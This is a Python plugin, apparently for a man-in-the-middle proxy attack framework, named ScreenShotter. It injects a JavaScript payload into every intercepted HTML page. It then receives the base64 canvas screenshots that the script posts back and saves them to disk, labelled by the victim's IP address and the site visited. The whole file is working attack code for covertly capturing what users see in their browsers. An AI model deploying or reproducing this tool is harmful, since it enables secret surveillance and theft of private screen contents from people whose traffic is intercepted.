from base64 import b64decode
from urllib import unquote
from bs4 import BeautifulSoup
from datetime import datetime
from libmproxy.protocol.http import decoded
from plugins.plugin import Plugin

class ScreenShotter(Plugin):
    name = 'ScreenShotter'
    optname = 'screen'
    desc = 'Uses HTML5 Canvas to render an accurate screenshot of a clients browser'
    version = '0.2'

    def request(self, context, flow):
        if flow.request.method == 'POST' and ('saveshot' in flow.request.path):
            context.handle_post_output = True
            img_file = '{}-{}-{}.png'.format(flow.client_conn.address.host, flow.request.host, datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
            try:
                with open('./logs/' + img_file, 'wb') as img:
                    img.write(b64decode(unquote(flow.request.content).decode('utf8').split(',')[1]))
                    img.close()
                context.log('[ScreenShotter] Saved screenshot to {}'.format(img_file))
            except Exception as e:
                context.log('[ScreenShotter] Error saving screenshot: {}'.format(e))

    def response(self, context, flow):
        if flow.response.headers.get_first("content-type", "").startswith("text/html"):
            with decoded(flow.response):  # Remove content encoding (gzip, ...)
                html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'))
                if html.body:
                    tag = html.new_tag('script', type='text/javascript')
                    with open('./core/javascript/screenshot.js', 'r') as payload:
                        payload = payload.read().replace('SECONDS_GO_HERE', str(context.interval*1000))
                        tag.append(payload)
                    html.body.append(tag)
                    context.log("[ScreenShotter] Injected JS payload: {}".format(flow.request.host))

                    flow.response.content = str(html)

    def options(self, options):
        options.add_argument("--interval", dest="interval", type=int, metavar="SECONDS", default=10, help="Interval at which screenshots will be taken (default 10 seconds)")
